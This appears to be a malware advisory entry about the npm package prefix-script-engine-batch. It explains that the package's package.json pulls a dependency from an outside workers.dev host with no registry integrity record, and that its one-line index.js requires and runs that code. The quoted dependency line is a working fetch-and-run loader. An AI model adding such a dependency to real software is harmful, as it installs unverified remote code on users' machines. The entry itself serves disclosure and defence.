details: prefix-script-engine-batch (published by the npm account `jikaya497`) is a loader for code hosted outside the npm registry. Its package.json declares the dependency `"source-binary-plugin-digest": "https://package-registry-receiver-stg.depx-research-bf0.workers.dev/npm/source-binary-plugin-digest"` and its index.js is the single line `module.exports = require('source-binary-plugin-digest');`, so installing the package fetches and installs whatever that host serves and requiring it runs that code; that tarball has no registry integrity record and the host can change it at any time. The same account published the packages in MAL-2026-20552, MAL-2026-20553 and MAL-2026-20604.
